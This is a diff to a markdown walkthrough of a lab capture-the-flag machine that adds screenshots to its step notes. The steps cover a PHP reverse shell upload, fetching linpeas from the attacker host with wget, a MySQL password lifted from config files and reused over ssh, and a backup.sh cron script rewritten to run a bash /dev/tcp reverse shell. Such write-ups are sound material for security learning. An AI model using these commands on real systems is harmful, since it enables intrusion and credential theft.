@@ -201,28 +201,59 @@ gobuster dir -u http://192.168.64.134 -w /usr/share/wordlists/rockyou.txt
 
 ![image](https://github.com/user-attachments/assets/e3734890-d762-4de9-bcc6-69aa59aa7a4b)
 
-# TBC here
+## Test and upload reverse shell rs.php file
+
+![image](https://github.com/user-attachments/assets/64b74537-9df6-440a-81e9-af8160edda8b)
+
     1 tested file upload of .sh file type succesfull
     2 upload .php file containing reverse shell script 
     3 connection succesful via nc on attacker machine
-    4 upgraded shell access to more stable version - python -c 'import pty; pty.spawn("/bin/sh")'
+    
+![image](https://github.com/user-attachments/assets/354f19d2-7615-420e-92d7-63578b888ea3)
+
+    4 after checking if python is available, proceeded to upgraded shell access to more stable version - python -c 'import pty; pty.spawn("/bin/sh")'
+
+![image](https://github.com/user-attachments/assets/e3e2ec07-e847-4678-b055-e31d8da59eca)
+
     5 on separate terminal set stty raw -echo | to allow reverse shell to behave more like a normal terminal | stty sane on normal terminal to break out and reset.
     6 cat /etc/passwd file to view the users on server to enumerate if we can possbily access any. Noted Grimmie had an executable script.
+
+![image](https://github.com/user-attachments/assets/df7e9d77-42e2-4ae3-b522-9d752b8a5f20)
+
     7 cat grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash - Provided what seemed to be a backups file that removed itself
+
+![image](https://github.com/user-attachments/assets/b86646cf-65f8-4795-ad50-d7a9587f912b)
+
     8 attempted escalate priviliges locally such as "sudo, sudo su, su -" with no success. attempted to write new files with no success. atetmpted to download files with no success.
     9 further Post Exploitation enumeration, on attacking machine download linpeas.sh. host python -m http webserver, and wget linpeas.sh file from victim machine. wget http://192.168.64.129:8000/linpeas.sh
+
+![image](https://github.com/user-attachments/assets/22defa11-8c60-4b39-b309-1c0a893e0b56)
+![image](https://github.com/user-attachments/assets/d74c9765-216e-44fb-b694-206951fc675f)
+![image](https://github.com/user-attachments/assets/4e0c8e54-7511-4d10-8158-13ad090bf853)
+
     10 run ./linpeas.sh > output.txt and view findings.
     11 findings: Admin account, MySQL, MySQL password: 
         /var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
         /var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+
+![image](https://github.com/user-attachments/assets/cfafcdb2-5b8f-4b66-b6b8-c8b37db4ab1e)
+
     12 At this point we attempt to ssh into victim machine to see if there has been password reuse, knowing that grimmie is likely an admin account. ssh grimmie@192.168.64.134 | password:"My_V3ryS3cur3_P4ss"
+
+![image](https://github.com/user-attachments/assets/fa386b82-5b2d-4f80-8ffe-6bedeb894f71)
+
     13 in this step we should attempt to look at cronjobs [need to work on this part more] | such as downloading pspy on attacker machine and wget to execute pspy on victim machine.
-    14 Since we have succesfully logged into grimmie's admin account, we can now nano the backup.sh file to perform another reverse shell to our attacker machine listening on port 3333. 
     
+    14 Since we have succesfully logged into grimmie's admin account, we can now nano the backup.sh file to perform another reverse shell to our attacker machine listening on port 3333. 
+
+![image](https://github.com/user-attachments/assets/89176d2e-360a-43e4-8f3a-3241af880668)
+
         #!/bin/bash
     
         bash -i >& /dev/tcp/192.168.64.129/3333 0>&1
         
+![image](https://github.com/user-attachments/assets/bc5eef7d-cec5-4d27-8b9f-ee206e1ad29f)
+      
     nc -nlvp 3333 on attacker machine
      15 connection succesful, cat flag.txt. 
 
